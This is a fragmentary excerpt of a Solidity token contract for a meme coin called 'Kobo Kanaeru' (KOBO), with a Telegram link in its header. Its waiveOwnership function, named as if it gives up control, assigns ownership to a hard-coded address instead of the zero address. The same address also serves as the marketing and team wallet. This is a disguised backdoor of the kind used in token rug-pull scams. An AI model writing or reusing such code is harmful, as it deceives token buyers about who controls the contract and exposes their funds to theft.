...
/**
Telegram : https://t.me/KoboKanaeruPortal
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xb7b1EDAC99358028c52dD18CbB40C2d1C8c7d404);
    }
...
contract KoboKanaeru is Context, IERC20, Ownable {
    ...
    string private _name = "Kobo Kanaeru";
    string private _symbol = "KOBO";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xb7b1EDAC99358028c52dD18CbB40C2d1C8c7d404);
    address payable private teamWalletAddress = payable(0xb7b1EDAC99358028c52dD18CbB40C2d1C8c7d404);
